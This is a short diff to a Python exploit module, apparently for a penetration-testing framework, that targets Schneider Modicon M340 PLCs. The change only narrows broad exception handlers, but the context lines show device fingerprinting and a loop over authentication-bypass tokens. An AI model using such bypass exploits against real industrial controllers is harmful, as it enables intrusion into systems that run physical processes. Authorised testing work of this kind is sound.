@@ -59,7 +59,7 @@ class Exploit(Exploit):
             resp = s.recv(512)
             s.close()
             return b"Modicon" in resp or b"M340" in resp or b"Schneider" in resp or b"PLC" in resp.upper()
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -102,7 +102,7 @@ class Exploit(Exploit):
                 s.close()
                 status = int(resp.split(b" ")[1]) if b"HTTP" in resp[:20] else 0
                 return status, resp
-            except Exception as e:
+            except (ConnectionError, TimeoutError, ValueError, OSError) as e:
                 return 0, str(e).encode()
 
         for token in self._BYPASS_TOKENS:
